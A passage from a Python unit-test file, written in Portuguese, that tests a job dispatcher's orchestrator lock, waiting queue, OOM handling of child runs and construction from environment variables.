        self.falhar_raia(a, "a1")
        self.falhar_raia(b, "b1")
        a.ciclo()
        b.ciclo()
        self.assertEqual(self.espera(), {REPO: [self.plano_id("a"), self.plano_id("b")]})
        despachante.capacidade.soltar_orquestrador(self.cap, REPO, "outro")
        b.ciclo()  # A ainda é o primeiro da espera
        self.assertEqual(self.runs(FABLE), [])
        a.estado["pausado"] = "pausa de teste"
        a._salvar()
        a.ciclo()
        self.assertEqual(self.espera(), {REPO: [self.plano_id("b")]})
        self.assertEqual(self.trava(), {})
        b.ciclo()
        self.assertEqual(len(self.runs(FABLE)), 1)
        self.assertEqual(self.trava(), {REPO: self.plano_id("b")})
        self.assertEqual(self.espera(), {})

    def test_plano_sem_acordada_nao_fica_na_espera(self):
        despachante.capacidade.tomar_orquestrador(self.cap, REPO, "outro")
        self.forja.definir_arquivo(REPO, "main", "docs/s.md", "# spec")
        a = self.de("a", [raia("a1")])
        a.iniciar(spec="docs/s.md")  # recusada: entra na espera
        self.assertEqual(self.espera(), {REPO: [self.plano_id("a")]})
        a.ciclo()  # a acordada continua pronta e recusada: A fica
        self.assertEqual(self.espera(), {REPO: [self.plano_id("a")]})
        a.estado["acordarPendentes"] = []
        a._salvar()
        a.ciclo()
        self.assertEqual(self.espera(), {})
        self.assertEqual(self.trava(), {REPO: "outro"})

    def test_reafirmacao_com_run_em_curso_passa_na_frente_da_espera(self):
        a = self.de("a", [raia("a1")])
        b = self.de("b", [raia("b1")])
        a.ciclo()
        b.ciclo()
        self.falhar_raia(a, "a1")
        a.ciclo()
        self.assertTrue(self.estado_de(a)["orquestrador"]["runId"])
        # o arquivo foi recriado, e B entrou na espera com a trava livre
        self.cap.unlink()
        despachante.capacidade.tomar_orquestrador(self.cap, REPO, "outro")
        despachante.capacidade.tomar_orquestrador(self.cap, REPO, self.plano_id("b"))
        despachante.capacidade.soltar_orquestrador(self.cap, REPO, "outro")
        self.assertEqual(self.espera(), {REPO: [self.plano_id("b")]})
        a.ciclo()
        self.assertEqual(self.trava(), {REPO: self.plano_id("a")})
        self.assertEqual(self.log_de(a, "trava_em_conflito"), [])
        self.falhar_raia(b, "b1")
        b.ciclo()
        self.assertEqual(len(self.runs(FABLE)), 1)

    def test_conflito_registra_o_dono_atual(self):
        a = self.de("a", [raia("a1")])
        a.ciclo()
        self.falhar_raia(a, "a1")
        a.ciclo()
        self.cap.unlink()
        despachante.capacidade.tomar_orquestrador(self.cap, REPO.upper(), "dono-x")
        a.ciclo()
        self.assertEqual([x["dono"] for x in self.log_de(a, "trava_em_conflito")], ["dono-x"])
        self.assertNotIn(self.plano_id("a"), self.espera().get(REPO, []))

    def test_oom_de_filho_com_limite_local_ja_em_2_e_sem_repetir(self):
        despachante.capacidade.configurar(self.cap, vagas=3, ram_minima_mb=0)
        a = self.de("a", [raia("a1")])
        a.ciclo()
        a.estado["limiteParalelo"] = 2
        a._salvar()
        filho = {"seedId": "s-1", "estado": "failed", "falha": "oom_killed"}
        self.motor.definir_plano(self.plan_run(a, "a1"), "running", [filho])
        a.ciclo()
        self.assertTrue(despachante.capacidade.ler(self.cap)["oomEm"])
        # o Paulo sobe as vagas de volta: o mesmo filho, visto de novo, não registra outro OOM
        despachante.capacidade.configurar(self.cap, vagas=3, ram_minima_mb=0)
        a.ciclo()
        a.ciclo()
        self.assertIsNone(despachante.capacidade.ler(self.cap)["oomEm"])
        # um filho OOM novo registra
        outro = {"seedId": "s-2", "estado": "failed", "runId": "run-y", "falha": "oom_killed"}
        self.motor.definir_plano(self.plan_run(a, "a1"), "running", [filho, outro])
        a.ciclo()
        self.assertTrue(despachante.capacidade.ler(self.cap)["oomEm"])

    def test_oom_de_filho_sem_run_id_tambem_chega_a_capacidade(self):
        despachante.capacidade.configurar(self.cap, vagas=3, ram_minima_mb=0)
        a = self.de("a", [raia("a1")])
        a.ciclo()
        self.motor.definir_plano(self.plan_run(a, "a1"), "running", [{"seedId": "s-1", "estado": "failed", "falha": "oom_killed"}])
        a.ciclo()
        self.assertTrue(despachante.capacidade.ler(self.cap)["oomEm"])

    # ------------------------------------------------ construção

    def ambiente_real(self, **extra):
        (self.repo_dir / ".fabrica").mkdir(exist_ok=True)
        (self.repo_dir / ".fabrica" / "config.json").write_text(json.dumps(CONFIG), encoding="utf-8")
        (self.tmp / "w").write_text(TOKEN + "\n", encoding="utf-8")
        (self.tmp / "g").write_text(TOKEN_GH + "\n", encoding="utf-8")
        ambiente = {
            "FABRICA_RAIZ": str(self.raiz),
            "FABRICA_REPO_DIR": str(self.repo_dir),
            "FABRICA_PROJETO": PROJETO,
            "FABRICA_REPO": REPO,
            "WARREN_TOKEN_FILE": str(self.tmp / "w"),
            "GH_TOKEN_FILE": str(self.tmp / "g"),
        }
        ambiente.update(extra)
        return ambiente

    def test_construir_le_capacidade_e_plano_id(self):
        d = despachante.construir(self.ambiente_real())
        self.assertIsNone(d.capacidade)
        self.assertIsNone(d.plano_id)
        d = despachante.construir(self.ambiente_real(FABRICA_CAPACIDADE=str(self.cap), FABRICA_PLANO_ID="dono--cliente--login"))
        self.assertEqual(d.capacidade, str(self.cap))
        self.assertEqual(d.plano_id, "dono--cliente--login")
        self.assertIs(d._mem_disponivel, despachante.capacidade.mem_disponivel_mb)
        self.assertFalse(self.cap.exists())

    def test_construir_recusa_um_sem_o_outro_ou_id_invalido(self):
        for extra in (
            {"FABRICA_CAPACIDADE": str(self.cap)},
            {"FABRICA_PLANO_ID": "dono--cliente--login"},
            {"FABRICA_CAPACIDADE": "", "FABRICA_PLANO_ID": "dono--cliente--login"},
            {"FABRICA_CAPACIDADE": str(self.cap), "FABRICA_PLANO_ID": ""},
            {"FABRICA_CAPACIDADE": str(self.cap), "FABRICA_PLANO_ID": "Dono--Cliente"},
            {"FABRICA_CAPACIDADE": str(self.cap), "FABRICA_PLANO_ID": "dono/cliente"},
            {"FABRICA_CAPACIDADE": str(self.cap), "FABRICA_PLANO_ID": "x\n"},
        ):
            with self.subTest(extra=extra):
                with self.assertRaises(despachante.ErroDeEntrada) as ctx:
                    despachante.construir(self.ambiente_real(**extra))
                self.assertTrue(any("FABRICA_" in e for e in ctx.exception.erros))

    def test_construtor_exige_os_dois_juntos(self):
        for extra in ({"capacidade": str(self.cap)}, {"plano_id": "dono--cliente--a"}, {"capacidade": str(self.cap), "plano_id": "A"}):
            with self.subTest(extra=extra):
                with self.assertRaises(despachante.ConfigInvalida):
                    self.novo(**extra)


if __name__ == "__main__":
    unittest.main()
